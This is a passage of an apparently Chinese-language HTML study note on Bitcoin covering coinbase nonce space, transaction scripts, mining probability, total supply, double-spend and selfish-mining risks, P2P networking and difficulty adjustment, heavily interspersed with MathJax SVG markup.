186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(533,363) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mn\"><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\"/><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\" transform=\"translate(500,0)\"/></g></g></g></g></g></svg></mjx-container></span>\n之后仍然有可能找不到符合难度要求的值。</p>\n<p>为了解决这个问题，还可以修改默克尔树树根。</p>\n<p>每个区块的交易里都有铸币交易（coin\nbase），这个交易的内容是可以任意修改的，可以通过改变这个字段的内容影响默克尔树树根，将搜索阈扩大到\n<span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: 0;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"2.919ex\" height=\"1.887ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -833.9 1290.1 833.9\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msup\"><g data-mml-node=\"mn\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(533,363) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mn\"><path data-c=\"39\" d=\"M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z\"/><path data-c=\"36\" d=\"M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z\" transform=\"translate(500,0)\"/></g></g></g></g></g></svg></mjx-container></span> 。</p>\n<h2 id=\"交易结构\">4.4 交易结构</h2>\n<figure>\n<img src=\"/blockchain/tutorial/tutorial-01/image-20250118151722722.png\" alt=\"image-20250118151722722\">\n<figcaption aria-hidden=\"true\">image-20250118151722722</figcaption>\n</figure>\n<p>左边是交易的比特币的来源，右边是这笔交易的输出，未被使用放到 UTXO\n里。</p>\n<figure>\n<img src=\"/blockchain/tutorial/tutorial-01/image-20250118151911989.png\" alt=\"image-20250118151911989\">\n<figcaption aria-hidden=\"true\">image-20250118151911989</figcaption>\n</figure>\n<p>每个交易都有输入脚本和输出脚本（几段字节码）。</p>\n<p>验证交易是否有效的方式，就是将来源的输出脚本，和当前交易的输入脚本拼接在一起执行，如果能顺利执行就是合法的。</p>\n<h2 id=\"挖矿难度分析\">4.5 挖矿难度分析</h2>\n<p>伯努利试验：<strong>只有两个</strong>输出结果的随机试验。</p>\n<p>伯努利过程：一系列独立的伯努利试验。</p>\n<p>性质：无记忆性，即每次尝试的结果都是独立的。</p>\n<p>这个性质，保证了挖矿的难度和算力成线性关系，保证了挖矿公平性。</p>\n<p>如果挖矿难度会随着尝试次数降低，则会给算力强的人cheng</p>\n<h2 id=\"比特币总量\">4.6 比特币总量</h2>\n<p>等比数列求和，最多能产生2100万个比特币。</p>\n<h2 id=\"恶意的节点\">4.7 恶意的节点</h2>\n<p>算力、挖矿或者是工作量证明，是用来保证区块链安全的。因为只要掌握算力的大多数节点是诚实的节点，就会有更大概率让产生的区块是诚实的。</p>\n<p>但是如果发生小概率事件被恶意节点拿到记账权，会发生什么呢？</p>\n<ul>\n<li><p>把别人的钱转给自己？不行，因为没有别人的私钥。如果硬要把这假的交易写进去，不会被其他诚实的节点认可。其他诚实节点会沿着之前的区块继续挖，这样会导致区块链分叉，最终最长合法链才是正确的。</p>\n<p>对攻击者而言，他挖出了一个区块，拿不到高额的出块奖励，也偷不到被人的钱。</p></li>\n<li><p>能不能双花？</p>\n<figure>\n<img src=\"/blockchain/tutorial/tutorial-01/image-20250118154759933.png\" alt=\"image-20250118154759933\">\n<figcaption aria-hidden=\"true\">image-20250118154759933</figcaption>\n</figure>\n<p>例如，M先倒卖比特币给A，在现实中收了A美元。而之后，M发布一个新的区块，接在前一个区块后面，然后扩展新的链，实现回滚合法交易的目的。</p>\n<p>防范这个问题的方法：等待确认。让A警惕一点，必须等到\n<code>M-&gt;A</code>\n这个区块后面接上好几个区块后，才确认交易成功。这使得M需要有更大的算力与最长合法链赛跑，才能实现交易回滚。</p>\n<p>比特币认为6个确认区块才算真正确认，就是平均要等待60分钟。</p></li>\n<li><p>能不能故意不把合法交易写入区块？可以，但是没用，总有诚实节点会发布这些交易，攻击者还少收了交易费。</p></li>\n<li><p>挖了区块不发布，藏起来（selfish\nmining）。如果恶意节点有较强的算力，他运气好，在别人挖出下一个区块的时候，他已经挖出了两个区块，就可以一次性发布两个区块，别人挖出的区块回滚。</p>\n<p>这里的回滚不能作为攻击手段，因为这并不能修改等待被提交的交易信息。那好处是什么？</p>\n<p>恶意节点在偷偷挖自己的第二个区块时，其他节点是不知道的，所以没有人跟他竞争挖第二个区块。如果发布出去了第一个区块，所有人都会开始挖第二个区块，可能会被别人抢先挖到第二个区块。</p>\n<p>但是这风险很大，只有算力很大的恶意节点有比较大的可能实现这种攻击，但是万一运气不好，自己挖出来的区块都浪费了。</p>\n<p>而且，这种攻击也不会影响区块链的安全，链上的数据并不会被修改，他在攻击的只是出块奖励。</p></li>\n</ul>\n<h1 id=\"网络\">5 网络</h1>\n<p>比特币工作在应用层，底层是P2P网络。</p>\n<p>节点之间通过TCP通信。所有节点都是对等的。</p>\n<p>新节点想加入比特币网络，向种子节点发请求，获取其他节点的地址。</p>\n<p>别的节点听到你的消息，就会把你加进去，一段时间没听到就会把你删掉。</p>\n<p>设计原则是：简单、健壮，但不高效。</p>\n<p>泛洪法传递消息（flooding），邻居节点的选取不考虑物理位置，很健壮但是很低效。</p>\n<p>比特币的区块大小限制为 1MB。</p>\n<h1 id=\"挖矿难度\">6 挖矿难度</h1>\n<p><span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"25.026ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 11061.6 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D43B\" d=\"M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 219 683Q260 681 355 681Q389 681 418 681T463 682T483 682Q499 682 499 672Q499 670 497 658Q492 641 487 638H485Q483 638 480 638T473 638T464 637T455 637Q416 636 405 634T387 623Q384 619 355 500Q348 474 340 442T328 395L324 380Q324 378 469 378H614L615 381Q615 384 646 504Q674 619 674 627T617 637Q594 637 587 639T580 648Q580 650 582 660Q586 677 588 679T604 682Q609 682 646 681T740 680Q802 680 835 681T871 682Q888 682 888 672Q888 645 876 638H874Q872 638 869 638T862 638T853 637T844 637Q805 636 794 634T776 623Q773 618 704 340T634 58Q634 51 638 51Q646 48 692 46H723Q729 38 729 37T726 19Q722 6 716 0H701Q664 2 567 2Q533 2 504 2T458 2T437 1Q420 1 420 10Q420 15 423 24Q428 43 433 45Q437 46 448 46H454Q481 46 514 49Q520 50 522 50T528 55T534 64T540 82T547 110T558 153Q565 181 569 198Q602 330 602 331T457 332H312L279 197Q245 63 245 58Q245 51 253 49T303 46H334Q340 38 340 37T337 19Q333 6 327 0H312Q275 2 178 2Q144 2 115 2T69 2T48 1Q31 1 31 10Q31 12 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(888,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mtext\" transform=\"translate(1277,0)\"><path data-c=\"62\" d=\"M307 -11Q234 -11 168 55L158 37Q156 34 153 28T147 17T143 10L138 1L118 0H98V298Q98 599 97 603Q94 622 83 628T38 637H20V660Q20 683 22 683L32 684Q42 685 61 686T98 688Q115 689 135 690T165 693T176 694H179V543Q179 391 180 391L183 394Q186 397 192 401T207 411T228 421T254 431T286 439T323 442Q401 442 461 379T522 216Q522 115 458 52T307 -11ZM182 98Q182 97 187 90T196 79T206 67T218 55T233 44T250 35T271 29T295 26Q330 26 363 46T412 113Q424 148 424 212Q424 287 412 323Q385 405 300 405Q270 405 239 390T188 347L182 339V98Z\"/><path data-c=\"6C\" d=\"M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z\" transform=\"translate(556,0)\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(834,0)\"/><path data-c=\"63\" d=\"M370 305T349 305T313 320T297 358Q297 381 312 396Q317 401 317 402T307 404Q281 408 258 408Q209 408 178 376Q131 329 131 219Q131 137 162 90Q203 29 272 29Q313 29 338 55T374 117Q376 125 379 127T395 129H409Q415 123 415 120Q415 116 411 104T395 71T366 33T318 2T249 -11Q163 -11 99 53T34 214Q34 318 99 383T250 448T370 421T404 357Q404 334 387 320Z\" transform=\"translate(1334,0)\"/><path data-c=\"6B\" d=\"M36 46H50Q89 46 97 60V68Q97 77 97 91T97 124T98 167T98 217T98 272T98 329Q98 366 98 407T98 482T98 542T97 586T97 603Q94 622 83 628T38 637H20V660Q20 683 22 683L32 684Q42 685 61 686T98 688Q115 689 135 690T165 693T176 694H179V463L180 233L240 287Q300 341 304 347Q310 356 310 364Q310 383 289 385H284V431H293Q308 428 412 428Q475 428 484 431H489V385H476Q407 380 360 341Q286 278 286 274Q286 273 349 181T420 79Q434 60 451 53T500 46H511V0H505Q496 3 418 3Q322 3 307 0H299V46H306Q330 48 330 65Q330 72 326 79Q323 84 276 153T228 222L176 176V120V84Q176 65 178 59T189 49Q210 46 238 46H254V0H246Q231 3 137 3T28 0H20V46H36Z\" transform=\"translate(1778,0)\"/><path data-c=\"20\" d=\"\" transform=\"translate(2306,0)\"/><path data-c=\"68\" d=\"M41 46H55Q94 46 102 60V68Q102 77 102 91T102 124T102 167T103 217T103 272T103 329Q103 366 103 407T103 482T102 542T102 586T102 603Q99 622 88 628T43 637H25V660Q25 683 27 683L37 684Q47 685 66 686T103 688Q120 689 140 690T170 693T181 694H184V367Q244 442 328 442Q451 442 463 329Q464 322 464 190V104Q464 66 466 59T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z\" transform=\"translate(2556,0)\"/><path data-c=\"65\" d=\"M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z\" transform=\"translate(3112,0)\"/><path data-c=\"61\" d=\"M137 305T115 305T78 320T63 359Q63 394 97 421T218 448Q291 448 336 416T396 340Q401 326 401 309T402 194V124Q402 76 407 58T428 40Q443 40 448 56T453 109V145H493V106Q492 66 490 59Q481 29 455 12T400 -6T353 12T329 54V58L327 55Q325 52 322 49T314 40T302 29T287 17T269 6T247 -2T221 -8T190 -11Q130 -11 82 20T34 107Q34 128 41 147T68 188T116 225T194 253T304 268H318V290Q318 324 312 340Q290 411 215 411Q197 411 181 410T156 406T148 403Q170 388 170 359Q170 334 154 320ZM126 106Q126 75 150 51T209 26Q247 26 276 49T315 109Q317 116 318 175Q318 233 317 233Q309 233 296 232T251 223T193 203T147 166T126 106Z\" transform=\"translate(3556,0)\"/><path data-c=\"64\" d=\"M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z\" transform=\"translate(4056,0)\"/><path data-c=\"65\" d=\"M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z\" transform=\"translate(4612,0)\"/><path data-c=\"72\" d=\"M36 46H50Q89 46 97 60V68Q97 77 97 91T98 122T98 161T98 203Q98 234 98 269T98 328L97 351Q94 370 83 376T38 385H20V408Q20 431 22 431L32 432Q42 433 60 434T96 436Q112 437 131 438T160 441T171 442H174V373Q213 441 271 441H277Q322 441 343 419T364 373Q364 352 351 337T313 322Q288 322 276 338T263 372Q263 381 265 388T270 400T273 405Q271 407 250 401Q234 393 226 386Q179 341 179 207V154Q179 141 179 127T179 101T180 81T180 66V61Q181 59 183 57T188 54T193 51T200 49T207 48T216 47T225 47T235 46T245 46H276V0H267Q249 3 140 3Q37 3 28 0H20V46H36Z\" transform=\"translate(5056,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(6725,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(7391.8,0)\"><path data-c=\"2264\" d=\"M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z\"/></g><g data-mml-node=\"mtext\" transform=\"translate(8447.6,0)\"><path data-c=\"74\" d=\"M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z\"/><path data-c=\"61\" d=\"M137 305T115 305T78 320T63 359Q63 394 97 421T218 448Q291 448 336 416T396 340Q401 326 401 309T402 194V124Q402 76 407 58T428 40Q443 40 448 56T453 109V145H493V106Q492 66 490 59Q481 29 455 12T400 -6T353 12T329 54V58L327 55Q325 52 322 49T314 40T302 29T287 17T269 6T247 -2T221 -8T190 -11Q130 -11 82 20T34 107Q34 128 41 147T68 188T116 225T194 253T304 268H318V290Q318 324 312 340Q290 411 215 411Q197 411 181 410T156 406T148 403Q170 388 170 359Q170 334 154 320ZM126 106Q126 75 150 51T209 26Q247 26 276 49T315 109Q317 116 318 175Q318 233 317 233Q309 233 296 232T251 223T193 203T147 166T126 106Z\" transform=\"translate(389,0)\"/><path data-c=\"72\" d=\"M36 46H50Q89 46 97 60V68Q97 77 97 91T98 122T98 161T98 203Q98 234 98 269T98 328L97 351Q94 370 83 376T38 385H20V408Q20 431 22 431L32 432Q42 433 60 434T96 436Q112 437 131 438T160 441T171 442H174V373Q213 441 271 441H277Q322 441 343 419T364 373Q364 352 351 337T313 322Q288 322 276 338T263 372Q263 381 265 388T270 400T273 405Q271 407 250 401Q234 393 226 386Q179 341 179 207V154Q179 141 179 127T179 101T180 81T180 66V61Q181 59 183 57T188 54T193 51T200 49T207 48T216 47T225 47T235 46T245 46H276V0H267Q249 3 140 3Q37 3 28 0H20V46H36Z\" transform=\"translate(889,0)\"/><path data-c=\"67\" d=\"M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z\" transform=\"translate(1281,0)\"/><path data-c=\"65\" d=\"M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z\" transform=\"translate(1781,0)\"/><path data-c=\"74\" d=\"M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z\" transform=\"translate(2225,0)\"/></g></g></g></svg></mjx-container></span></p>\n<p>挖矿难度（也就是公式里的target）是认为规定的。比特币的PoW设计要求出块时间平均要达到10min才能满足安全保证，但是随着算力的增加，挖矿所需时间会不短减小。因此认为的调小\ntarget 加大挖矿难度，均衡时间。</p>\n<p>如果挖矿时间过短，但是网络传播速度不变（可能要几十秒），每个节点出块时间越来越短，分叉就会越来越多。分叉越多，系统的总算力就被分散了，攻击难度就下降了。</p>\n<p>每2016个区块（约14天）调整一次挖矿难度。</p>\n<p><span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -1.991ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"62.47ex\" height=\"5.09ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -1370 27611.7 2250\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mtext\"><path data-c=\"74\" d=\"M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z\"/><path data-c=\"61\" d=\"M137 305T115 305T78 320T63 359Q63 394 97 421T218 448Q291 448 336 416T396 340Q401 326 401 309T402 194V124Q402 76 407 58T428 40Q443 40 448 56T453 109V145H493V106Q492 66 490 59Q481 29 455 12T400 -6T353 12T329 54V58L327 55Q325 52 322 49T314 40T302 29T287 17T269 6T247 -2T221 -8T190 -11Q130 -11 82 20T34 107Q34 128 41 147T68 188T116 225T194 253T304 268H318V290Q318 324 312 340Q290 411 215 411Q197 411 181 410T156 406T148 403Q170 388 170 359Q170 334 154 320ZM126 106Q126 75 150 51T209 26Q247 26 276 49T315 109Q317 116 318 175Q318 233 317 233Q309 233 296 232T251 223T193 203T147 166T126 106Z\" transform=\"translate(389,0)\"/><path data-c=\"72\" d=\"M36 46H50Q89 46 97 60V68Q97 77 97 91T98 122T98 161T98 203Q98 234 98 269T98 328L97 351Q94 370 83 376T38 385H20V408Q20 431 22 431L32 432Q42 433 60 434T96 436Q112 437 131 438T160 441T171 442H174V373Q213 441 271 441H277Q322 441 343 419T364 373Q364 352 351 337T313 322Q288 322 276 338T263 372Q263 381 265 388T270 400T273 405Q271 407 250 401Q234 393 226 386Q179 341 179 207V154Q179 141 179 127T179 101T180 81T180 66V61Q181 59 183 57T188 54T193 51T200 49T207 48T216 47T225 47T235 46T245 46H276V0H267Q249 3 140 3Q37 3 28 0H20V46H36Z\" transform=\"translate(889,0)\"/><path data-c=\"67\" d=\"M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z\" transform=\"translate(1281,0)\"/><path data-c=\"65\" d=\"M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z\" transform=\"translate(1781,0)\"/><path data-c=\"74\" d=\"M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z\" transform=\"translate(2225,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(2891.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mtext\" transform=\"translate(3947.6,0)\"><path data-c=\"74\" d=\"M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z\"/><path data-c=\"61\" d=\"M137 305T115 305T78 320T63 359Q63 394 97 421T218 448Q291 448 336 416T396 340Q401 326 401 309T402 194V124Q402 76 407 58T428 40Q443 40 448 56T453 109V145H493V106Q492 66 490 59Q481 29 455 12T400 -6T353 12T329 54V58L327 55Q325 52 322 49T314 40T302 29T287 17T269 6T247 -2T221 -8T190 -11Q130 -11 82 20T34 107Q34 128 41 147T68 188T116 225T194 253T304 268H318V290Q318 324 312 340Q290 411 215 411Q197 411 181 410T156 406T148 403Q170 388 170 359Q170 334 154 320ZM126 106Q126 75 150 51T209 26Q247 26 276 49T315 109Q317 116 318 175Q318 233 317 233Q309 233 296 232T251 223T193 203T147 166T126 106Z\" transform=\"translate(389,0)\"/><path data-c=\"72\" d=\"M36 46H50Q89 46 97 60V68Q97 77 97 91T98 122T98 161T98 203Q98 234 98 269T98 328L97 351Q94 370 83 376T38 385H20V408Q20 431 22 431L32 432Q42 433 60 434T96 436Q112 437 131 438T160 441T171 442H174V373Q213 441 271 441H277Q322 441 343 419T364 373Q364 352 351 337T313 322Q288 322 276 338T263 372Q263 381 265 388T270 400T273 405Q271 407 250 401Q234 393 226 386Q179 341 179 207V154Q179 141 179 127T179 101T180 81T180 66V61Q181 59 183 57T188 54T193 51T200 49T207 48T216 47T225 47T235 46T245 46H276V0H267Q249 3 140 3Q37 3 28 0H20V46H36Z\" transform=\"translate(889,0)\"/><path data-c=\"67\" d=\"M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z\" transform=\"translate(1281,0)\"/><path data-c=\"65\" d=\"M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 